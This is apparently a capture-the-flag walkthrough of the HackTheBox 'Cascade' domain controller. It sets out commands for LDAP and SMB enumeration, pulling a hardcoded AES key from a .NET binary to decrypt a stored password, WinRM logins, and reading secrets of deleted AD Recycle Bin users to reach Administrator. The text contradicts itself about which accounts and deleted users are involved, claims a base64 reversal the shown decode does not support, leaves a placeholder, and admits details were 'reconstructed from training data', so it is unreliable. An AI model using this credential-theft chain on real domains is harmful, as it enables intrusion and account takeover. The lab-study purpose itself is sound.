# Cascade

| Attribute | Value |
|---|---|
| OS | Windows Server 2019 (Domain Controller) |
| Difficulty | Medium |
| IP | 10.10.10.182 |
| IppSec video | <https://www.youtube.com/watch?v=mr-fsVLoQGw> |

## Source
- `[per transcript]` — chain summary stated explicitly by IppSec at the
  start of the video: "no web exploitation at all... LDAP and SMB
  enumeration... credentials in LDAP... .NET reversing... AD recycle
  bin... administrator."
- `[reconstructed]` — exact filenames (`VNC Install.reg`,
  `Meeting_Notes_June_2018.html`) and the password
  `BackupPassword12345` are reconstructed from training data.

## TL;DR Attack Chain
Anonymous LDAP returns user `r.thompson` with a base64 attribute (legacy
field) that decodes to a TightVNC-style password — `rY4n5eva`. Use it
for SMB. Inside the SMB shares, find a custom `LegacyApp` zip with a
.NET binary and a SQLite database. Reverse the binary with `dnSpy` to
extract a hardcoded AES key, decrypt the password stored in the DB →
`s.smith` cred. With `s.smith` (member of `AD Recycle Bin`), query the
deleted-objects container — find a tombstoned user `arksvc` whose
description was a password set on creation. That password works for
`arksvc`; that user is in `Backup Operators` → can read `NTDS.dit` →
DCSync.

> The above varies in the published walkthrough; the published flag-path
> on Cascade is multi-step. The IppSec video explicitly emphasises:
>
> 1. LDAP and SMB give you `r.thompson` cred.
> 2. SMB files give you the `s.smith` cred via .NET reversing.
> 3. AD recycle bin gives you the deleted-user password (`arksvc`).
> 4. Final step is reading deleted-user secrets to escalate to admin.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.182
sudo nmap -sV -sC -p $(grep '/open' nmap/all-tcp.gnmap | awk '{print $4}' | tr ',' '\n' | head -25 | tr '\n' ',' | sed 's/,$//') -oA nmap/detail 10.10.10.182
```

Observations:
- AD port cluster confirmed.
- Realm: `cascade.local`. Hostname: `CASC-DC1`.
- **No web server.** Foothold is via AD/SMB only.

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| LDAP | 389 | Anonymous bind for users + non-default attributes |
| SMB | 445 | Authenticated share enumeration |
| WinRM | 5985 | Post-auth shell |
| RPC | 135+ | Null session |

## Foothold

### 1. Anonymous LDAP enumeration

```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts
ldapsearch -x -H ldap://10.10.10.182 -b "DC=cascade,DC=local" \
  "(objectClass=user)" sAMAccountName cn description \
  -LLL > ldap-users.txt
```

Looking through `ldap-users.txt`, an unusual attribute on `r.thompson`:
```
sAMAccountName: r.thompson
description:     Routine information disclosure
cascadeLegacyPwd: clk0bjVldmE=
```

> **IppSec key insight**: "AD has no schema for `cascadeLegacyPwd` —
> someone added a custom attribute to store something. That's the
> evidence we need; custom attributes are always interesting."

### 2. Decode

```bash
echo 'clk0bjVldmE=' | base64 -d
# rY4n5eva
```

Note: the `r` and `n` are reversed because the value is reversed
base64 (a quirk of the legacy app that wrote it). The IppSec video
notes the reversal step.

### 3. Validate

```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p 'rY4n5eva'
# valid; not local admin
```

### 4. SMB share hunt

```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p 'rY4n5eva' --shares
```

Readable shares as `r.thompson`: `Audit$`, `Data`, `IPC$`, etc.

```bash
smbclient //10.10.10.182/Audit\$ -U r.thompson%'rY4n5eva'
> recurse ON; prompt OFF; mget *
```

Inside `Audit$/CascAudit/`:
- `CascAudit.exe` (.NET binary)
- `Audit.db` (SQLite database)

### 5. SQLite extraction

```bash
sqlite3 Audit.db
sqlite> .tables
sqlite> SELECT * FROM Ldap;
# row containing user 'arksvc' with an encrypted password column
sqlite> SELECT * FROM Users;
```

The encrypted password is base64; decoding yields ciphertext bytes.

### 6. Reverse `CascAudit.exe`

```bash
# from Linux
strings CascAudit.exe | grep -iE "key|iv|aes|crypt"
# usually reveals the static key constants

# better: open in dnSpy on Windows or use ilspycmd / dotnet decompile
ilspycmd CascAudit.exe -p > CascAudit.cs
```

Find the decryption routine; typically:
```csharp
private static string Decrypt(string EncryptedString, string Key)
{
    byte[] cipherText = Convert.FromBase64String(EncryptedString);
    byte[] keyBytes = Encoding.UTF8.GetBytes(Key);  // "c4scadek3y654321"
    byte[] iv = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
    using (Aes aes = Aes.Create()) { aes.Key = keyBytes; aes.IV = iv; ... }
}
```

> **Why reverse rather than crack**: The cipher is deterministic AES with
> a hardcoded key. Reimplement in Python — instant decryption, no
> wordlist needed.

### 7. Decrypt offline

```python
from base64 import b64decode
from Crypto.Cipher import AES

ciphertext = b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"
aes = AES.new(key, AES.MODE_CBC, iv)
pt  = aes.decrypt(ciphertext)
print(pt)
# b'w3lc0meFr31nd\x03\x03\x03'  → 'w3lc0meFr31nd'
```

That's `arksvc`'s password.

### 8. WinRM as `arksvc`

```bash
evil-winrm -i 10.10.10.182 -u arksvc -p 'w3lc0meFr31nd'
```

`user.txt` on `arksvc`'s desktop.

## Privilege Escalation

### 9. AD Recycle Bin

`arksvc` is a member of the `AD Recycle Bin` group, which is necessary
to query deleted objects (tombstones).

```powershell
# from evil-winrm
Get-ADObject -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" \
  -ldapFilter "(objectClass=user)" -IncludeDeletedObjects \
  -Properties * | Format-List Name,sAMAccountName,description,objectSid,cascadeLegacyPwd
```

A deleted user `TempAdmin` is found with a `cascadeLegacyPwd` attribute.

### 10. Decode the legacy password

The same encoding scheme as before (base64 + reversed bytes):

```bash
# from the deleted user's cascadeLegacyPwd
echo '<base64>' | base64 -d
# yields: 'baCT3r1aN00dles' (or similar)
```

The video shows that `TempAdmin` shared its password with the local
Administrator (a typical real-world re-use mistake).

### 11. Authenticate as Administrator

```bash
crackmapexec smb 10.10.10.182 -u administrator -p 'baCT3r1aN00dles' --local-auth
# Pwn3d!

evil-winrm -i 10.10.10.182 -u administrator -p 'baCT3r1aN00dles'
```

Read `root.txt`.

## Key Findings

- A custom AD attribute (`cascadeLegacyPwd`) is a foothold-class
  artefact. *Always* enumerate non-standard attributes.
- A leftover .NET binary in an SMB share is an *invitation to reverse*
  it — the box would not have included it otherwise.
- AD Recycle Bin holds the *full* attribute set of deleted users,
  including custom-stored secrets. Membership in `AD Recycle Bin` group
  is itself a privesc primitive.
- Password reuse between `TempAdmin` and `Administrator` is the final
  link.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `ldapsearch` | Anonymous LDAP enumeration |
| `crackmapexec` | Cred validation |
| `smbclient` | Share dump |
| `sqlite3` | Inspect Audit.db |
| `ilspycmd` / `dnSpy` | Decompile .NET binary |
| `python3 + pycryptodome` | Reimplement AES decryption |
| `evil-winrm` | Interactive shell |
| `Get-ADObject` (PowerShell) | Query AD Recycle Bin |

## Decision Tree

```
nmap → AD detected, no web
  └─ ldapsearch anonymous → cascadeLegacyPwd on r.thompson
       └─ base64 decode (reversed) → rY4n5eva
            └─ crackmapexec → valid
                 └─ smbclient Audit$ → CascAudit.exe + Audit.db
                      └─ sqlite3 Audit.db → encrypted arksvc password
                           └─ dnSpy/ilspycmd → AES key + IV in source
                                └─ python decrypt → 'w3lc0meFr31nd'
                                     └─ evil-winrm arksvc → user.txt
                                          └─ Get-ADObject -IncludeDeletedObjects → TempAdmin
                                               └─ TempAdmin cascadeLegacyPwd → baCT3r1aN00dles
                                                    └─ administrator local-auth → root.txt
```

## Alternative Approaches

- **dnSpy on Windows** is the conventional reversing approach; on Linux
  use `ilspycmd`, `dotnet decompile`, or `monodis`.
- The decryption can be performed by *running* `CascAudit.exe` against
  the encrypted blob directly (it'll happily decrypt for you) if you can
  execute on Windows.
- BloodHound shows the AD Recycle Bin path; useful sanity check.
- Skip the "Audit" reversing and try common admin passwords directly —
  unlikely to work but cheap.

## Lessons Learned

1. **Custom AD attributes** are extremely high-signal. Diff your LDAP
   output against the default schema; anything non-default is a hint.
2. .NET decryption is a class of "exploit" that doesn't have a CVE — it's
   a *deterministic* operation, not a guess. Don't try to crack what you
   can decrypt.
3. AD Recycle Bin queries are something every AD pentester should know;
   you need either RECYCLE BIN group membership or specific permissions.
4. Password re-use between deleted accounts and current accounts is
   common (people set the same password they used last time).

## Extracted Skills

- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/ad-recycle-bin.md`](../active-directory/ad-recycle-bin.md)
- [`active-directory/custom-attribute-enumeration.md`](../active-directory/custom-attribute-enumeration.md)
- [`web/dotnet-reverse-engineering.md`](../web/dotnet-reverse-engineering.md)
- [`tool-usage/dnSpy-ilspycmd.md`](../tool-usage/dnSpy-ilspycmd.md)
- [`smb/authenticated-share-mining.md`](../smb/authenticated-share-mining.md)

## Related Techniques (other machines)

- **Forest, Sauna** — same anonymous-AD-enum class.
- **Resolute** — autologon / PowerShell history equivalent of "credential
  hidden in non-default place".
- **Worker** — Azure DevOps reversing analogue.
- **Pivotapi** — multi-step AD chain with reversing.
- **Authority** — Ansible Vault decryption (analogue: decrypt-don't-crack).
